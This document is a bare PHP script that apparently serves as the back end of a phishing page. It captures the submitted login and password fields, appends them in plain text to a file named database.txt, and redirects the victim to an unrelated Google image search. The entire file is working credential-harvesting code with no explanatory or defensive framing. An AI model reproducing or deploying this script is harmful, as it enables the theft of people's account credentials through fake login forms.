<?PHP 

$Log = $_POST['login'];

$Pass = $_POST['password'];

$log = fopen("database.txt","at");

fwrite($log,"\n $Log:$Pass");

fclose($log);

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://www.google.com/search?q=%D0%B4%D0%B5%D0%B4&client=ubuntu&hs=2Qf&channel=fs&sxsrf=ALiCzsbiKRbOJbmrVairLknJk80T6pffVQ:1667327488930&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiToc71zo37AhWFQfEDHVX9BJ0Q_AUoAXoECAMQAw&biw=1526&bih=788&dpr=1#imgrc=3YFEeQXxSMrVwM'></head></html>";

?>
